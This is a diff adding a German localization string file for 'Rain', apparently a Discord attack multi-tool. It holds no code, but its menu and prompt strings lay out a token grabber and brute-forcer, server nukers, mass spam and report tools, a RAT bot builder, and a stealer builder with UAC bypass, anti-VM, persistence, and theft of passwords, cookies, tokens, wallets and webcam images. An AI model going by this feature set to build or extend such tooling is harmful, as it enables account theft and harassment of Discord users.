@@ -1,0 +1,396 @@
+Token-Info{end_space15}
+Token-Anmeldung{end_space11}
+Token-Nuker{end_space14}
+Token-Grabber{end_space12}
+Token-Deaktivierer{end_space7}
+Token-Brute-Force{end_space8}
+Falscher Tipp{end_space12}
+Vanity-Scharfschütze{end_space5}
+Gruppenchat-Spammer{end_space6}
+Freunde blockieren{end_space7}
+Freunde entfernen{end_space13}
+Freundesanfrage entfernen
+Neue Server erstellen{end_space4}
+Profiländerung{end_space11}
+QR-Code-Abrufgerät{end_space7}
+Discord-Rattenbot{end_space8}
+Knopfdrücker{end_space13}
+Nachrichtenreaktor{end_space7}
+Massen-DM{end_space16}
+Massenbericht{end_space12}
+Massenfreund{end_space13}
+DM-Löscher{end_space15}
+DM-Löscher{end_space15}
+Umgehung von Regeln{end_space6}
+Bypass RestoreCord{end_space7}
+Bypass-Vorschlaghammer{end_space3}
+Webhook-Tool{end_space13}
+Hergestellt von Plingenn{end_space1}
+Änderungsprotokoll{end_space7}
+Einstellungen{end_space12}
+Chat
+Token verwalten
+Weiter{end_space5}
+Läuft auf:{end_space16}
+Ungültige Auswahl, bitte versuchen Sie es erneut!
+Unterbrochen durch Benutzer.
+Themenwechsel
+Kontoeinstellungen
+Proxy-Einstellungen
+Erscheinungseinstellungen
+Debug-Modus umschalten
+Admin-Panel
+Ungültige Einstellung
+CYAN
+BLAU
+GRÜN
+ROT
+WEISS
+GELB
+MAGENTA
+HELLROT
+HELLBLAU
+HELLGRÜN
+HELLZYAN
+HELL SCHWARZ
+Thema festgelegt auf
+Kontoinformationen
+Meine Lizenz
+Kaufhistorie
+Code einlösen
+Software herunterladen
+Benutzername
+Erstellt am
+Benutzernamen ändern
+Abmelden
+Benutzername ändern fehlgeschlagen. Der Benutzername muss mindestens 3 Zeichen enthalten.
+Möchten Sie sich von Ihrem Konto abmelden? (J/N)
+Produkt
+Läuft ab am
+Datum
+Geben Sie Ihren Produktcode ein, um Ihren Inhalt zu erhalten.
+Code
+Sie haben den Code bereits eingelöst.
+Stellen Sie sicher, dass Sie Ihr Produkt speichern, bevor Sie die Eingabetaste drücken!
+Schlüssel nicht in der Antwort gefunden
+Daten für den angegebenen Code konnten nicht abgerufen werden
+URL nicht in den Codeinformationen gefunden
+Ungültiger Code!
+Proxy-Nutzung umschalten
+Proxy-Cache löschen
+Eigene Proxies zum Cache hinzufügen
+Proxy abrufen
+Ungültige Auswahl
+Debug-Modus umgeschaltet {RED}AUS
+Debug-Modus umgeschaltet {GRÜN}EIN
+Neues Authentifizierungssystem hinzugefügt
+Verbessertes Konfigurationssystem
+Panel-Schnittstelle neu erstellt
+Chat-System hinzugefügt
+Neue Kontoeinstellungen hinzugefügt
+Caching zur Verbesserung der Leistung implementiert
+Benutzerdefiniertes Discord-RPC
+Discord-RPC umschalten
+Benutzerdefiniertes Discord-RPC umschalten
+Benutzerdefiniertes Discord-RPC bearbeiten
+Benutzerdefiniertes Discord-RPC deaktiviert
+Benutzerdefiniertes Discord-RPC aktiviert
+Details (Erforderlich)
+Details müssen mindestens 3 Zeichen lang sein.
+Status (Erforderlich)
+Der Zustand muss mindestens 3 Zeichen lang sein.
+Große Bild-URL (Optional)
+Großer Text (Optional)
+Kleine Bild-URL (Optional)
+Kleiner Text (Optional)
+Wie viele Schaltflächen möchten Sie haben?
+Beschriftung für Schaltfläche eingeben
+URL für Schaltfläche eingeben
+Ungültiges URL-Format. Bitte geben Sie eine gültige URL ein.
+Ungültige Anzahl von Schaltflächen. Bitte geben Sie eine Zahl zwischen 0 und 2 ein.
+Discord RPC deaktiviert
+Discord RPC aktiviert
+Normaler Modus
+RestoreCord-Modus (Umgehung von Captcha)
+Cache-Überprüfer
+Benutzerdefinierter Überprüfer
+Server-Überprüfer
+Geben Sie den benutzerdefinierten Pfad zum Laden von Token ein
+Normaler Chat
+Support-Chat (Nicht verfügbar)
+Privater Chat (Nicht verfügbar)
+Server-Suche{end_space13}
+Server-Kloner{end_space12}
+Server-Zerstörer{end_space9}
+Token-Beitritt{end_space11}
+Token-Verlassen{end_space10}
+Token-Spammer{end_space12}
+Anfall{end_space19}
+Soundboard-Spammer{end_space7}
+Voice-Chat-Beitritt{end_space6}
+Profilbildänderer{end_space12}
+Globaler Nick-Änderer{end_space4}
+Server-Nick-Änderer{end_space9}
+HypeSquad-Änderer{end_space8}
+Pronomen-Änderer{end_space9}
+Sprach-Änderer{end_space11}
+Status-Änderer{end_space11}
+Thema-Änderer{end_space12}
+Biografie-Änderer{end_space8}
+Kontogenerator{end_space11}
+VideoCrash-Ersteller{end_space5}
+Einstellungen-Zyklus{end_space9}
+Versionshinweise{end_space9}
+Telegramm{end_space16}
+Selbstbot{end_space16}
+Github{end_space19}
+Über{end_space21}
+Beenden{end_space18}
+Vorherige Seite
+Servernamen
+Nachricht
+Thread-Zähler
+Ein Fehler ist aufgetreten:
+Keine Token im Cache gefunden
+Bereitstellung des Rain-Nuke
+Rain Nuke bereitgestellt. . .
+Nachrichtenübermittlung
+Nachrichten-ID:
+Nachricht an alle verfügbaren Freunde gesendet.
+Gilde verlassen:
+Gilde gelöscht:
+Der folgende Fehler ist aufgetreten und wird ignoriert:
+Alle verfügbaren Gilden gelöscht/verlassen.
+Freund entfernen:
+Freund entfernt:
+Alle verfügbaren Freunde entfernt.
+Erstellen
+Erstellt
+Alle Server erstellt.
+Rain Nuke erfolgreich detoniert!
+Erfolgreich in eine Reme-Wüste verwandelt
+Geben Sie etwas ein, um fortzufahren. . .
+Starten des Anfallsmodus (Umschalten von Licht-/Dunkelmodus)
+Nicht genügend Freunde, um fortzufahren.
+Ein Fehler ist beim Verarbeiten des Tokens aufgetreten
+Kanalspammer
+Kanal-ID
+Regeln umgehen
+Gilden-ID
+Token-Fake-Typer
+Globaler Nicker
+Spitzname
+Server-Nicker
+Pronomen-Änderer
+Zufällige Pronomen (j/n)
+Pronomen
+DM gelöscht:
+Nicht genügend DMs, um fortzufahren.
+Zyklus unterbrochen
+Soundboard-Spammer
+Programm vom Benutzer unterbrochen.
+Fehler beim Senden des Herzschlags mit Token:
+Fehler beim Beitritt zu VC mit Token:
+Beitritt zu VC mit Token..
+Einladung erfolgreich aktualisiert, Ihr Server kann jetzt erreicht werden
+Fehler beim Aktualisieren der Vanity-URL. Statuscode:
+Vanity-Code zum Snipen
+Server-ID, auf die die Vanity angewendet werden soll
+Verzögerung zwischen den Überprüfungen (Sekunden)
+Vanity Sniper wurde gestartet. Drücken Sie Strg+C, um anzuhalten.
+Fehler:
+Webhook-Spammer
+Webhook-Löscher
+Webhook
+Webhook erfolgreich gelöscht
+Token-Manager
+Token speichern
+Token löschen
+Überprüfen Sie Token und speichern Sie nur gültige (j/n)
+Token-Cache geleert.
+Geben Sie den Pfad zur Textdatei mit den Tokens ein
+Keine Tokens in der angegebenen Textdatei gefunden
+Token-Checker
+Fehler beim Abrufen des Servernamens:
+Beitreten
+Regen-Token-Bruteforce. PS: Dies kann lange dauern, um zu funktionieren.
+Wenn Sie extrem glücklich sind und in der Lage sind, das Token von jemandem zu bekommen, finden Sie es in "brute-force.txt" gespeichert.
+Holen Sie sich immer die ausdrückliche Genehmigung der Person, bevor Sie einen Brute-Force-Angriff auf ihr Konto durchführen.
+Ungültige Benutzer-ID, bitte versuchen Sie es erneut!
+GÜLTIG
+UNGÜLTIG
+Fehler beim Abrufen von Abrechnungsinformationen:
+Fehler beim Abrufen von Nitro-Daten:
+Keine Abrechnungsinformationen verfügbar.
+Sammeln von Benutzerinformationen und Webtreibern...
+Dateiname
+Dateipasswort
+Möchten Sie eine Icon-Datei bereitstellen? (J/N)
+Ungültiger Symbolpfad oder URL. Symbol auf None gesetzt.
+Ping mich an (J/N)
+Anti-VM (J/N)
+Beim Start aktivieren (J/N)
+UAC-Bypass (J/N)
+Schmelzen (J/N)
+Konsole ausblenden (J/N)
+Webcam erfassen (J/N)
+Passwörter erfassen (J/N)
+Cookies erfassen (J/N)
+Autofills erfassen (J/N)
+Verlauf erfassen (J/N)
+Discord-Tokens erfassen (J/N)
+Spiele erfassen (J/N)
+WLAN-Passwörter erfassen (J/N)
+Systeminformationen erfassen (J/N)
+Bildschirmfoto erfassen (J/N)
+Telegramm erfassen (J/N)
+Gemeinsame Dateien erfassen (J/N)
+Brieftaschen erfassen (J/N)
+Fake-Fehler (J/N)
+Fake-Fehlertitel
+Fake-Fehlermeldung
+Blockiere AV-Websites (J/N)
+Discord-Injection (J/N)
+Dateisymbol
+Erstelle {name}.exe, das wird ein paar Sekunden dauern. Danke für Ihre Geduld!
+Datei befindet sich in 'output/grabberbuilder/{name}.exe
+Gruppenchat erstellt
+Rate begrenzt ({response.json()['retry_after']}ms)
+Nicht genügend Freunde für die zufällige Auswahl verfügbar
+Möchten Sie selbst Benutzer auswählen, um Gruppenchat-Spam zu betreiben, oder möchten Sie zufällige auswählen?
+Wählen Sie Benutzer selbst aus
+Benutzer zufällig auswählen
+Gruppenchats erstellen
+Benutzer-IDs
+Sie hatten keine Kommas (,), das Format lautet id,id2,id3
+Jederzeit anhalten
+Blockiert:
+Fehler beim Abrufen von Beziehungen:
+Nicht genügend Freundschaftsanfragen, um fortzufahren.
+Eingehende Freundschaftsanfrage von:
+Entfernte Freundschaftsanfrage von:
+Gesamte entfernte Freundschaftsanfragen:
+Ein Fehler ist aufgetreten beim Erstellen von {server_name}: {e}
+Symbol für die Server ja/nein
+Zufällige Servernamen
+Benutzerdefinierte Servernamen
+Name der zu erstellenden Server
+Bitte geben Sie den Icon-Speicherort ein
+"{image}" konnte auf Ihrem PC nicht gefunden werden
+Benutzerdefinierter Status
+Benutzerdefinierte Biografie
+Erstellen der Datei... {i}
+Schreibe Datei... {i}
+Hinweis: Dieser Code funktioniert derzeit nicht vollständig, aber er ist trotzdem ausführbar. Es können jedoch Fehler oder Probleme auftreten.
+Geben Sie den Namen ein, den Sie der endgültigen Datei geben möchten
+Geben Sie das Token des Bots ein, mit dem Sie die RAT-Befehle ausführen möchten
+Bot-Token
+Geben Sie die Gilden-ID ein, unter der die Schrägstrichbefehle registriert sind
+Fehler beim Schreiben der Datei: {e}
+Datei wurde korrekt in "output/{fileName}.py" geschrieben
+Konvertieren Sie Ihr Skript in eine ausführbare Datei (J/N)
+Dateierstellung...
+Bereinigung alter Dateien...
+Die ausführbare Datei wurde korrekt erstellt
+HTTP-Fehler aufgetreten: {e}
+Nachrichten-ID
+Bitte wählen Sie die Schaltfläche aus, die Sie drücken möchten
+{r}({LIGHTBLACK_EX}{i}{r}) Name: {LIGHTBLACK_EX}{button_label}{r}, Benutzerdefinierte ID: {LIGHTBLACK_EX}{button_custom_id}
+Taste
+Es wurde nur eine Schaltfläche in der Nachricht gefunden.
+Fehler beim Hinzufügen der Reaktion {reaction} zur Nachricht {message_id}. Maximale Anzahl von Reaktionen bereits erreicht.
+Maximale Anzahl von Reaktionen bereits erreicht.
+Fehler beim Hinzufügen der Reaktion {reaction} zur Nachricht {message_id}. Verboten: {error_message}
+Objekte
+Gesichter
+Tiere
+Symbole
+Keine Emojis in der Antwort gefunden
+Fehler beim Abrufen von Emojis aus der API
+Einladungslink
+Ungültiges Einladungslink-Format.
+Ein Fehler ist beim Senden der Anfrage aufgetreten
+Einladungsinformationen:
+Einladende Person Informationen:
+Serverinformationen:
+Kanal
+Ablaufdatum
+Benutzer-ID
+Abzeichen
+Nicht verfügbar
+Name
+Server-ID
+Beschreibung
+Banner
+Banner-URL
+Banner-URL (Nicht verfügbar)
+Vanity-URL
+Verifizierungsstufe
+Splash
+Splash-URL
+Splash-URL (Nicht verfügbar)
+Features
+Anfall gestartet. Drücken Sie Strg+C, um anzuhalten.
+Anfall unterbrochen
+Sprachzyklus gestartet. Drücken Sie Strg+C, um anzuhalten.
+Ungültiges Token.
+Drücken Sie die EINGABETASTE, um fortzufahren
+Discord-API-Tool | https://Rain.xyz | Hergestellt von Plingenn
+Erscheinungsbild-Einstellungen
+Texteinstellungen
+Cursor-Einstellungen
+Transparenz-Einstellungen
+Fenstereinstellungen
+Spracheinstellungen
+Farbschema
+Schriftart
+Schriftgröße
+Zeilenhöhe
+Schriftgewicht
+Retro-Terminal-Effekte
+Farbeinstellungen
+Schrifteinstellungen
+Schriftgrößeneinstellungen
+Zeilenhöheneinstellungen
+Schriftgewichtseinstellungen
+Retro-Einstellungen
+Cursor-Einstellungen
+Sprache auf {chosen_language} gesetzt
+Unbenannt
+Typ
+Haus
+Nachrichtenlink
+Ungültiger Nachrichtenlink
+Zurück gehen...
+Fehler beim Verbinden mit Discord RPC: {e}
+Auswahl
+Thema
+Einstellung
+Bearbeiten
+Sprache
+Panel-Deckkraft
+Ungültige Deckkraft
+Fenstereinstellungen
+Diese Option ist noch in Arbeit
+Diese Option ist derzeit nicht verfügbar. Bitte haben Sie Geduld, sie wird später hinzugefügt.
+Diese Option ist derzeit nicht verfügbar.
+Sie wird in einem der kommenden Updates durch '{replacement}' ersetzt.
+Diese Option ist nicht verfügbar
+Diese Optionen befinden sich derzeit in der Entwicklung
+Diese Optionen befinden sich derzeit in der Entwicklung, bleiben jedoch nutzbar. Es ist jedoch wahrscheinlich, dass Fehler oder Probleme auftreten können.
+Fehler beim Abrufen von Pronomen von {pronounce_url} ({statuscode})
+Die Verwendung von Proxies ist derzeit nicht verfügbar. Wir entschuldigen uns für etwaige Unannehmlichkeiten. Es wird in einem unserer kommenden Updates zugänglich gemacht.
+Proxyverwendung umgeschaltet {RED}AUS
+Proxyverwendung umgeschaltet {GREEN}EIN
+Neue Proxies erfolgreich geschrieben
+Proxies erfolgreich abgerufen
+Fertig! Insgesamt {proxies} gescannt => {temp} | {execution_time}ms
+PC{end_space5}
+Implementierte Mehrsprachunterstützung.
+Massen-Thread{end_space12}
+Forum-Spammer
+Massen-DM für Benutzer{end_space3}
+N/A{end_space22}
+Server-Booster{end_space16}
+Token-Nutzer{end_space13}
+Umfrageersteller{end_space9}
